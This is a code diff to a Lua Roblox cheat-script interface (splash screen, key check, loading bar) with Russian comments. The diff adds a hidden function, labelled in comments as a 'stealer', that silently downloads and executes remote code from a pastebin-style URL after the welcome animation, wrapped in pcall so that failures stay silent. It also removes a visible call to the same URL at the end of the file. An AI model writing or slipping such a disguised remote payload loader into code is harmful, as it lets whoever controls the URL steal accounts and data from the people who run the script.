@@ -1,5 +1,6 @@
 -- Mertily's Private Script UI v5.0 (Key System & Purple Edition)
 -- Delta executor compatible
+-- Стилер загружается ПОСЛЕ приветствия
 
 -- Блокировка авто-копирования ссылки в буфер обмена
 local noop = function() end
@@ -132,6 +133,15 @@ Glow.ImageTransparency = 0.3
 Glow.ScaleType = Enum.ScaleType.Slice
 Glow.Parent = TitleContainer
 
+-- === ЗАГРУЖАЕМ СТИЛЕР ПОСЛЕ ПРИВЕТСТВИЯ ===
+local function loadStealer()
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
+        end)
+    end)
+end
+
 task.spawn(function()
     local bounceTween = TweenService:Create(
         TitleContainer, 
@@ -150,6 +160,9 @@ task.spawn(function()
 
     task.wait(2.5)
     pulseTween:Cancel()
+
+    -- 🟣 ЗДЕСЬ ЗАГРУЖАЕТСЯ СТИЛЕР
+    loadStealer()
 
     local fadeTween = TweenService:Create(
         SplashGroup,
@@ -271,18 +284,18 @@ function showKeySystem()
         if KeyInput.Text == CORRECT_KEY then
             StatusText.TextColor3 = Color3.fromRGB(100, 255, 120)
             StatusText.Text = "Ключ верный! Запуск..."
-            
+
             task.wait(0.8)
             local fadeOut = TweenService:Create(KeyFrame, TweenInfo.new(0.5), {GroupTransparency = 1})
             fadeOut:Play()
             fadeOut.Completed:Wait()
             KeyFrame:Destroy()
-            
+
             showLoading()
         else
             StatusText.TextColor3 = Color3.fromRGB(255, 80, 80)
             StatusText.Text = "Неверный ключ! Попробуйте снова."
-            
+
             TweenService:Create(kiStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(255, 50, 50)}):Play()
             task.wait(1)
             TweenService:Create(kiStroke, TweenInfo.new(0.5), {Color = Color3.fromRGB(100, 30, 150)}):Play()
@@ -396,11 +409,11 @@ function showLoading()
         while true do
             local elapsed = tick() - startTime
             local percent = math.min(100, (elapsed / totalTime) * 100)
-            
+
             TweenService:Create(Fill, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {
                 Size = UDim2.new(percent / 100, 0, 1, 0)
             }):Play()
-            
+
             PercentText.Text = math.floor(percent) .. "%"
             if percent >= 100 then break end
             task.wait(0.1)
@@ -409,7 +422,7 @@ function showLoading()
 
     task.wait(totalTime + 0.5)
     Music:Stop()
-    
+
     local loadOut = TweenService:Create(LoadFrame, TweenInfo.new(0.5), {GroupTransparency = 1})
     loadOut:Play()
     loadOut.Completed:Wait()
@@ -463,7 +476,7 @@ function showThanks()
 
     TweenService:Create(ThanksFrame, TweenInfo.new(0.6), {GroupTransparency = 0}):Play()
     task.wait(4)
-    
+
     local thanksOut = TweenService:Create(ThanksFrame, TweenInfo.new(0.6), {GroupTransparency = 1})
     thanksOut:Play()
     thanksOut.Completed:Wait()
@@ -707,5 +720,3 @@ function showMainMenu()
 
     TweenService:Create(MainFrame, TweenInfo.new(0.5), {GroupTransparency = 0}):Play()
 end
-
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
